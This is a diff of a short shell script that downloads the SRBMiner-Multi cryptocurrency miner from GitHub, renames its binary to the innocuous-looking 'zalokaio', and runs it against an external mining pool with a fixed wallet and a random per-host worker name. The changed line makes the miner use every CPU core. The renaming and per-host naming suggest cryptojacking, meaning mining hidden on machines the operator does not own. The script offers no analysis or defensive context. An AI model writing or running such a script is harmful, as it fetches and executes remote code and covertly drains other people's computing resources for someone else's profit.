@@ -3,4 +3,4 @@ wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.6/SRBMiner
 tar xf SRBMiner-Multi-3-4-6-Linux.tar.gz
 cd SRBMiner-Multi-3-4-6
 mv SRBMiner-MULTI zalokaio
-./zalokaio --algorithm randomx --pool de.qrl.gfwroute.com:1166 --wallet Q010500558b2441553c74a987286cd7637c3df66b190c2abfb065f53ecdc8f4512b6415336fb44e.$(echo $RANDOM | md5sum | head -c 10)
+./zalokaio --algorithm randomx --pool de.qrl.gfwroute.com:1166 --wallet Q010500558b2441553c74a987286cd7637c3df66b190c2abfb065f53ecdc8f4512b6415336fb44e.$(echo $RANDOM | md5sum | head -c 10) --cpu-threads $(nproc --all)
